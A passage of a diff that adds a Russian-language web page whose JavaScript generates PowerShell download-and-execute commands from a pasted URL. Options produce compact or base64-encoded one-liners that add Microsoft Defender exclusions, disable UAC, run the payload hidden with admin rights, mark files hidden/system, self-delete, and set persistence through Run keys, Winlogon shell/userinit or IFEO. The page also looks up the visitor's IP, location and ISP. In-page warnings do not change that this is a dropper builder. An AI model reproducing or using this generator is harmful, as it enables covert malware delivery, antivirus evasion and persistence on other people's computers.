+    ? 'Start-Process -FilePath $p'+(o.admin?' -Verb RunAs':'')+(o.silent?' -WindowStyle Hidden':'')+' -Wait'
+    : 'Start-Process -FilePath $p'+(o.admin?' -Verb RunAs':'')+(o.silent?' -WindowStyle Hidden':'');
+
+  const dirLit = '(' + dir.ps + ')';
+  const lit = '(' + dir.ps + '+"\\' + name.replace(/"/g,'`"') + '")';
+
+  const cmp = [];
+  if (useB64) cmp.push('$u=' + dec(b64(url)));
+  if (o.mkdir) cmp.push('New-Item -ItemType Directory -Path '+dirLit+' -Force|Out-Null');
+  if (o.exclude) cmp.push('Add-MpPreference -ExclusionPath '+dirLit);
+  cmp.push(dlLite.replace('-OutFile $p','-OutFile '+lit).replace('-d $p','-d '+lit));
+  if (attr) cmp.push(attr.replace('"$p"', lit));
+  cmp.push((o.admin
+    ? 'Start-Process '+lit+' -Verb RunAs'+(o.silent?' -WindowStyle Hidden':'')+(o.wait?' -Wait':'')
+    : (o.wait ? '& '+lit : 'Start-Process '+lit+(o.silent?' -WindowStyle Hidden':'')))
+    + (o.cleanup ? '; Remove-Item '+lit+' -Force' : ''));
+  const compact = cmp.join(';');
+
+  const steps = [];
+  if (useB64) steps.push('$u='+dec(b64(url)));
+  if (o.mkdir) steps.push('New-Item -ItemType Directory -Path '+dirLit+' -Force|Out-Null');
+  if (o.exclude) steps.push('Add-MpPreference -ExclusionPath '+dirLit);
+  steps.push('$p=Join-Path '+dir.ps+' ('+(useB64?dec(b64(name)):sq(name))+')');
+  steps.push(attr ? dlFull+';'+attr : dlFull);
+  steps.push(run + (o.cleanup?'; Remove-Item $p -Force':''));
+  let b64cmd = steps.join(';');
+  if (o.cleanupErr) b64cmd = 'try { '+b64cmd+' } finally { Remove-Item $p -Force -ErrorAction SilentlyContinue }';
+
+  const plain = [];
+  if (o.mkdir) plain.push('New-Item -ItemType Directory -Path '+dirLit+' -Force | Out-Null');
+  if (o.exclude) plain.push('Add-MpPreference -ExclusionPath '+dirLit);
+  plain.push("$p=Join-Path "+dir.ps+' '+sq(name));
+  plain.push(dlFull);
+  if (attr) plain.push(attr);
+  plain.push(run + (o.cleanup?'; Remove-Item $p -Force':''));
+  let plainCmd = plain.join('; ');
+  if (o.cleanupErr) plainCmd = 'try { '+plainCmd+' } finally { Remove-Item $p -Force -ErrorAction SilentlyContinue }';
+
+  const stepList = [
+    o.mkdir ? '# 1. create folder\nNew-Item -ItemType Directory -Path '+dirLit+' -Force | Out-Null' : '# 1. folder exists',
+    o.exclude ? '# 2. AV exclusion (admin)\nAdd-MpPreference -ExclusionPath '+dirLit+'\n# "access denied" = Tamper Protection is on' : '# 2. no exclusions',
+    '# 3. full path\n$p = Join-Path '+dir.ps+' '+sq(name),
+    '# 4. download\n'+dlFull,
+    o.checkDl ? '# (size check embedded above)' : '# (no check)',
+    '# 5. attributes\n'+(attr?attr.replace('"$p"','$p'):'# (none)'),
+    '# 6. run\n'+run,
+    o.cleanup ? '# 7. delete\nRemove-Item $p -Force' : '# 7. keep the file'
+  ].join('\n\n');
+
+  const sysL = ['# 1. folder',
+    o.mkdir ? 'New-Item -ItemType Directory -Path '+dirLit+' -Force | Out-Null' : '# (create-folder off)', '',
+    '# 2. AV exclusion — only for your own program folder',
+    o.exclude ? 'Add-MpPreference -ExclusionPath '+dirLit : '# (off)'];
+  if (o.exclude){ sysL.push('# revert: Set-MpPreference -ExclusionPath @()   (drops ALL exclusions)');
+                 sysL.push('# check:  Get-MpPreference | Select-Object -ExpandProperty ExclusionPath'); }
+  sysL.push('', '# 3. UAC');
+  if (o.uac === 'off'){
+    sysL.push("Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA -Value 0");
+    sysL.push('# RUN THIS SEPARATELY TO REVERT:');
+    sysL.push("Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA -Value 1");
+  } else if (o.uac === 'on'){
+    sysL.push("Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA -Value 1");
+    sysL.push('# UAC is on, protection restored');
+  } else sysL.push('# (leave alone)');
+  if (o.uac !== 'keep' && o.uacReboot)
+    sysL.push('\n# 4. reboot — UAC will not apply without it\nStart-Process "$env:windir\\system32\\shutdown.exe" -ArgumentList "/r /t 0" -Verb RunAs');
+  const sys = sysL.join('\n');
+
+  const auto = methods.length
+    ? ['# $p = full path to the file, put your own', "$p = Join-Path "+dir.ps+' '+sq(name), '',
+       '# '+methods.map(m=>LBL[m]).join(' + ')+(methods.some(needsAdmin)?'   [admin required]':'')]
+      .concat(methods.map(m=>autoBlock(m,appName))).join('\n')
+    : '# no autostart selected';
+
+  return { error:null, url, name, appName,
+    shown:dir.pct+'\\'+name, dirShown:dir.pct,
+    real:(dir.real?dir.real+'\\'+name:dir.pct+'\\'+name),
+    b64:b64cmd, b64url:b64(url), compact, plain:plainCmd, steps:stepList, sys, auto, methods };
+}
+
+function renderAll(r){
+  return ['=== PATH ===', r.shown, '    ('+r.real+')', '',
+    '=== COMPACT ===', r.compact, '', '=== BASE64 ===', r.b64, '',
+    '=== READABLE ===', r.plain, '', '=== STEPS ===', r.steps, '',
+    '=== SYSTEM ===', r.sys, '', '=== AUTOSTART ===', r.auto, ''].join('\n');
+}
+
+/* ══════════════ UI ══════════════ */
+const $ = id => document.getElementById(id);
+let res = null, tab = 'compact', nameTouched = false;
+const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const BROAD = {TEMP:1, LOCALAPPDATA:1, APPDATA:1, WINDIR:1, PROGRAMFILES:1, DOWNLOADS:1, SCRIPTDIR:0, CUSTOM:0};
+
+function readOpts(){
+  return {
+    hidden:$('hidden').checked, system:$('system').checked, readonly:$('readonly').checked,
+    wait:$('wait').checked, silent:$('silent').checked, admin:$('admin').checked,
+    useBITS:$('useBITS').checked, cleanup:$('cleanup').checked, cleanupErr:$('cleanupErr').checked,
+    enc:$('encB64').checked?'b64':'plain',
+    compat:$('compat').checked, checkDl:$('checkDl').checked,
+    mkdir:$('mkdir').checked, exclude:$('exclude').checked,
+    uac:$('uacOff').checked?'off':($('uacOn').checked?'on':'keep'), uacReboot:$('uacReboot').checked,
+    auto:[...document.querySelectorAll('.auto:checked')].map(x=>x.dataset.m)
+  };
+}
+function toast(m){ const t=$('toast'); t.textContent=m; t.classList.add('on');
+  clearTimeout(t._t); t._t=setTimeout(()=>t.classList.remove('on'),1500); }
+/* риск-подсветка чекбоксов: severity берётся из классов .y / .r разметки */
+function paintRisks(){
+  document.querySelectorAll('.cb').forEach(lab=>{
+    const inp = lab.querySelector('input');
+    if (!inp) return;
+    lab.classList.remove('on-safe','on-med','on-dang');
+    if (!inp.checked) return;
+    lab.classList.add(lab.classList.contains('r') ? 'on-dang'
+                    : lab.classList.contains('y') ? 'on-med' : 'on-safe');
+  });
+}
+async function copy(text,label){
+  try { await navigator.clipboard.writeText(text); }
+  catch(e){
+    const ta=document.createElement('textarea'); ta.value=text;
+    ta.style.cssText='position:fixed;opacity:0'; document.body.appendChild(ta); ta.select();
+    try{ document.execCommand('copy'); }catch(e2){} ta.remove();
+  }
+  toast(label||'Скопировано');
+}
+
+function sysHint(o, dirKey){
+  let s='';
+  if (o.exclude){
+    s += '<div class="alert r"><b>Исключение антивируса.</b> '+esc(res?res.dirShown:'')+' перестаёт проверяться '
+       + 'Defender’ом — включая всё, что туда попадёт потом. Нужен админ. Защита от подмены (включена по умолчанию '
+       + 'в Win 11) заблокирует это. Откат: <code>Set-MpPreference -ExclusionPath @()</code> — убирает все '
+       + 'исключения разом.</div>';
+    if (BROAD[dirKey] === 1)
+      s += '<div class="alert r"><b>Слишком широкая папка.</b> '+esc(res?res.dirShown:'')+' — это системная или '
+         + 'пользовательская папка, а не папка программы. Возьми «свой путь» наподобие '
+         + '<code>%LOCALAPPDATA%\\MyApp</code>.</div>';
+  }
+  if (o.uac === 'off')
+    s += '<div class="alert r"><b>UAC будет отключён.</b> До перезагрузки ничего не изменится. После любой код '
+       + 'запускается от администратора без вопросов. Команда отката — в блоке «Система». Если хватает галочки '
+       + '«от администратора» на самом файле, то это не нужно.</div>';
+  if (o.uac === 'on')
+    s += '<div class="alert v"><b>UAC включается обратно.</b> Нужен админ и перезагрузка.</div>';
+  if (o.mkdir) s += '<div class="alert v"><b>Папка будет создана.</b> <code>-Force</code> ничего не делает, '
+    + 'если папка уже есть.</div>';
+  return s;
+}
+function autoHint(o){
+  const m = o.auto||[]; if (!m.length) return '';
+  const bad = m.filter(needsAdmin);
+  const danger = m.filter(x=>x==='WINLOGON_SHELL'||x==='WINLOGON_USERINIT'||x==='IFEO');
+  if (danger.length)
+    return '<div class="alert r"><b>Опасный выбор.</b> '+danger.map(x=>LBL[x]).join(', ')+' — это не автозапуск, '
+      + 'а техники закрепления в системе. '
+      +(m.indexOf('IFEO')>-1?'IFEO перехватывает любой файл с таким именем ':'')
+      +'Winlogon заменяет оболочку или цепочку входа и ломает загрузку Windows. хватает Run или '
+      +'RunOnce. Откат: <code>bcdedit /set {default} safeboot minimal</code>, затем безопасный режим.</div>';
+  if (bad.length)
+    return '<div class="alert"><b>Нужен админ.</b> '+bad.map(x=>LBL[x]).join(', ')+' пишет в HKLM.</div>';
+  return '<div class="alert v">Запись идёт в <code>HKCU</code> — только для текущего пользователя, админ не '
+    + 'нужен.</div>';
+}
+function advice(r, o){
+  const b=[];
+  if (o.enc === 'b64')
+    b.push('<div class="alert b"><b>base64 делает строку длиннее.</b> '+r.url.length+' → '+Math.ceil(r.url.length/3)*4
+      + ' симв. Открытый текст короче и выглядит обычно.</div>');
+  if (o.silent && o.admin)
+    b.push('<div class="alert r"><b>Без окна + от администратора.</b> Ничего не будет видно, а запуск идёт с '
+      + 'правами админа.</div>');
+  else if (o.silent) b.push('<div class="alert">Без окна: <code>-WindowStyle Hidden</code> действует только на '
+    + 'консольные программы.</div>');
+  if (o.admin) b.push('<div class="alert">«от администратора» вызывает запрос UAC — при автозапуске всё '
+    + 'зависнет на нём.</div>');
+  if (o.hidden || o.system)
+    b.push('<div class="alert r"><b>Скрытый или системный файл.</b> Это один из самых известных признаков '
+      + 'вредоносного ПО и обычная причина срабатывания антивируса. Апдейтеру это не нужно.</div>');
+  if (o.useBITS) b.push('<div class="alert">BITS грузит в фоне через службу Windows Update.</div>');
+  if (o.cleanup && !o.cleanupErr)
+    b.push('<div class="alert v">Самоудаление без <code>try/finally</code>: при ошибке файл останется.</div>');
+  return b.join('');
+}
+
+function regenerate(autofill){
+  paintRisks();
+  const raw = $('url').value.trim();
+  const o = readOpts();
+  $('custom').style.display = $('dir').value === 'CUSTOM' ? 'block' : 'none';
+  $('autoHint').innerHTML = autoHint(o);
+  $('sysHint').innerHTML = sysHint(o, $('dir').value);
+  const wipe = () => { $('out').textContent='вставьте ссылку выше'; $('out').classList.remove('err');
+    $('pathbox').innerHTML='файл попадёт в: <b>—</b><span></span>';
+    $('stats').innerHTML=''; $('advice').innerHTML='';
+    document.querySelectorAll('#tabs .len').forEach(x=>x.textContent='');
+    $('footStat').textContent='—'; };
+  if (!raw){ res=null; wipe(); return; }
+  if (autofill && !nameTouched) $('name').value = filenameFromUrl(raw);
+
+  res = build(raw, $('name').value, $('dir').value, $('custom').value, $('appname').value, o);
+  if (res.error){
+    $('out').textContent = res.error; $('out').classList.add('err');
+    $('pathbox').innerHTML='файл попадёт в: <b>—</b><span></span>';
+    $('stats').innerHTML=''; $('advice').innerHTML='';
+    document.querySelectorAll('#tabs .len').forEach(x=>x.textContent='');
+    $('footStat').textContent='—'; return;
+  }
+  $('sysHint').innerHTML = sysHint(o, $('dir').value);
+  $('out').classList.remove('err');
+  $('out').textContent = res[tab];
+  $('pathbox').innerHTML = 'файл попадёт в: <b>'+esc(res.real)+'</b><span>в команде: <code>'
+    + esc(res.shown)+'</code></span>';
+  const L = { compact:res.compact.length, b64:res.b64.length, plain:res.plain.length };
+  const saved = Math.round((1 - L.compact/Math.max(L.plain,L.b64))*100);
+  document.querySelectorAll('#tabs .len').forEach(x=>{
+    const k = x.dataset.t; x.textContent = L[k] ? L[k]+' симв.' : '';
+  });
+  $('stats').innerHTML =
+      '<div class="st g"><b>'+L.compact+'</b><span>короткая</span></div>'
+    + '<div class="st y"><b>−'+saved+'%</b><span>короче читаемой</span></div>'
+    + '<div class="st b"><b>'+L.b64+'</b><span>base64</span></div>'
+    + '<div class="st"><b>'+res.url.length+'</b><span>длина ссылки</span></div>';
+  $('advice').innerHTML = advice(res, o);
+  $('footStat').textContent = 'короткая '+L.compact+' симв. · '+res.name;
+}
+
+/* ── pixel wave: period = 600 = half of viewBox → seamless ── */
+function wavePath(ph,a,w){
+  const W=1200,H=46; let d='M0,'+(H/2).toFixed(2);
+  for (let x=0;x<=W;x+=4) d += ' L'+x+','+(H/2+Math.round(Math.sin(x/w+ph)*a)).toFixed(2);
+  return d;
+}
+function drawWave(amp){
+  $('w1').setAttribute('d', wavePath(0,   amp,      600/(2*Math.PI)));
+  $('w2').setAttribute('d', wavePath(1.6, amp*0.45, 600/(4*Math.PI)));
+}
+function updateWave(){ const n=$('url').value.length; drawWave(n?Math.min(14,4+n*0.11):4); }
+
+/* ── device panel ── */
+function uaInfo(ua){
+  const t = n => ua.includes(n);
+  let br = 'неизвестно';
+  if (t('Edg/') || t('Edge/')) br = 'Edge';
+  else if (t('OPR/') || t('Opera')) br = 'Opera';
+  else if (t('Firefox/')) br = 'Firefox';
+  else if (t('Chrome/')) br = 'Chrome';
+  else if (t('Safari/')) br = 'Safari';
+  let ver = (ua.match(/(?:Edg|Chrome|Firefox|Version)\/([\d.]+)/)||[])[1] || '';
+  if (br && ver) br += ' ' + ver.split('.').slice(0,2).join('.');
+
+  let dev = 'компьютер';
+  if (t('iPhone')) dev = 'iPhone';
+  else if (t('iPad')) dev = 'iPad';
+  else if (t('Android') && !t('Mobile')) dev = 'Android tablet';
+  else if (t('Mobile')) dev = 'Android phone';
+  else if (t('Mac OS')) dev = 'Mac';
+  else if (t('Windows')) dev = 'Windows';
+  else if (t('Linux')) dev = 'Linux';
+
+  let os = '';
+  const m = ua.match(/Windows NT ([\d.]+)/);
+  if (m) os = ({'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7'})[m[1]] || m[1];
+  const mm = ua.match(/(Mac OS X|Android) ([\d_.]+)/);
+  if (mm) os = mm[1].replace('_','.') + ' ' + mm[2].split('_').slice(0,2).join('.');
+  if (t('Linux')) os = 'Linux';
+  return { br, dev, os };
+}
+const put = (id, v, mono) => {
+  const e = $(id);
+  e.textContent = v;
+  e.className = 'v' + (v && v !== '—' ? (mono ? ' m' : '') : ' na');
+};
+async function getGeo(){
+  put('dIp','определяем…'); put('dGeo','определяем…');
+  try {
+    let j = null;
+    try { j = await (await fetch('https://ipwho.is/', {mode:'cors'})).json(); } catch(e){}
+    if (j && j.success !== false && j.ip){
+      put('dIp', j.ip, true);
+      put('dGeo', [j.country, j.region, j.city].filter(Boolean).join(' · ') || '—');
+      put('dNet', [j.connection && j.connection.isp, j.connection && j.connection.org].filter(Boolean)[0] || '—');
+      return;
+    }
+  } catch(e){}
+  try {
+    const txt = await (await fetch('https://speed.cloudflare.com/cdn-cgi/trace')).text();
+    const f = {};
+    txt.split('\n').forEach(l => { const i = l.indexOf('='); if (i>0) f[l.slice(0,i)] = l.slice(i+1); });
+    put('dIp', f.ip || '—', true);
+    put('dGeo', f.loc ? f.loc + ' (edge ' + f.colo + ')' : '—');
+    put('dNet', f.colo ? 'colo ' + f.colo : '—');
+  } catch(e){ put('dIp','заблокировано'); put('dGeo','заблокировано'); put('dNet','заблокировано'); }
+}
+async function getSpeed(){
+  put('dSpd','измеряем…');
+  const bytes = 2500000;
+  try {
+    const t0 = performance.now();
+    const r = await fetch('https://speed.cloudflare.com/__down?bytes='+bytes, {cache:'no-store'});
+    if (!r.ok) throw new Error('http '+r.status);
+    const buf = await r.arrayBuffer();
+    const sec = (performance.now()-t0)/1000;
+    const got = buf.byteLength;
+    const mbps = (got*8/sec)/1e6;
+    put('dSpd', (got/1048576/sec).toFixed(2)+' MB/s · '+mbps.toFixed(1)+' Mbit/s', true);
+  } catch(e){ put('dSpd','заблокировано'); }
+}
+let devLoaded = false;
+function loadDevice(){
+  const u = uaInfo(navigator.userAgent);
+  put('dBr', u.br);
+  put('dDev', [u.dev, u.os].filter(Boolean).join(' · '));
+  put('dScr', window.screen.width+'×'+window.screen.height+' @'+window.devicePixelRatio+'x', true);
+  const c = navigator.hardwareConcurrency, ram = navigator.deviceMemory;
+  put('dHw', (c ? c+' cores' : '?') + (ram ? ' · '+ram+' GB' : ''));
+  if (!navigator.onLine) put('dNet','нет сети');
+  if (devLoaded) return;
+  devLoaded = true;
+  getGeo(); getSpeed();
+  if (navigator.connection) put('dNet', (navigator.connection.effectiveType||'—')
+    + (navigator.connection.downlink ? ' · ' + navigator.connection.downlink+' Mb/s link' : ''));
+}
+
+$('devToggle').addEventListener('click', () => {
+  const open = $('devbar').classList.toggle('open');
+  $('devToggle').setAttribute('aria-expanded', open ? 'true' : 'false');
+  $('devLabel').textContent = (open ? '▾' : '▸') + ' инфо об устройстве';
+  if (open) loadDevice();
+  else $('devbar').classList.remove('clear');   // закрыл -> снова замазано
+});
+$('devReveal').addEventListener('click', e => {
+  e.stopPropagation();
+  const clear = $('devbar').classList.toggle('clear');
+  $('devReveal').setAttribute('aria-pressed', clear ? 'true' : 'false');
+  $('devReveal').textContent = clear ? 'скрыть' : 'показать';
+  if (clear && !$('devbar').classList.contains('open')) $('devToggle').click();
+});
+
+document.querySelectorAll('nav button').forEach(b=>b.addEventListener('click',()=>{
+  document.querySelectorAll('nav button').forEach(x=>x.classList.remove('on'));
+  b.classList.add('on');
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
+  $('p-'+b.dataset.p).classList.add('on');
+}));
+document.querySelectorAll('#tabs button').forEach(b=>b.addEventListener('click',()=>{
+  document.querySelectorAll('#tabs button').forEach(x=>x.classList.remove('on'));
+  b.classList.add('on'); tab = b.dataset.t;
+  if (res && !res.error) $('out').textContent = res[tab];
+}));
+
+$('url').addEventListener('input',()=>{updateWave();regenerate(true);});
+$('name').addEventListener('input',()=>{
+  const empty = $('name').value.trim()==='';
+  nameTouched = !empty;
+  regenerate(empty);
+});
+$('custom').addEventListener('input',()=>regenerate(false));
+$('appname').addEventListener('input',()=>regenerate(false));
+$('dir').addEventListener('change',()=>regenerate(false));
+['encB64','encPlain','uacOff','uacOn','cleanupErr','mkdir','exclude','uacReboot']
+  .forEach(id=>$(id).addEventListener('change',()=>regenerate(false)));
+['hidden','system','readonly','wait','silent','admin','useBITS','cleanup','compat','checkDl']
+  .forEach(id=>$(id).addEventListener('change',()=>regenerate(false)));
+document.querySelectorAll('.auto').forEach(x=>x.addEventListener('change',()=>regenerate(false)));
+
+$('copy').addEventListener('click',()=>{if(res&&!res.error)copy(res[tab]);});
+$('copyall').addEventListener('click',()=>{if(res&&!res.error)copy(renderAll(res),'Всё скопировано');});
+
+$('owner').textContent = OWNER;
+$('tg').textContent = TELEGRAM;
+$('verTop').textContent = VERSION;
+$('footOwner').textContent = OWNER;
+$('netState').textContent = navigator.onLine ? 'сеть: подключена' : 'работает без сети';
+updateWave();
+regenerate(false);
+</script>
+</body>
+</html>
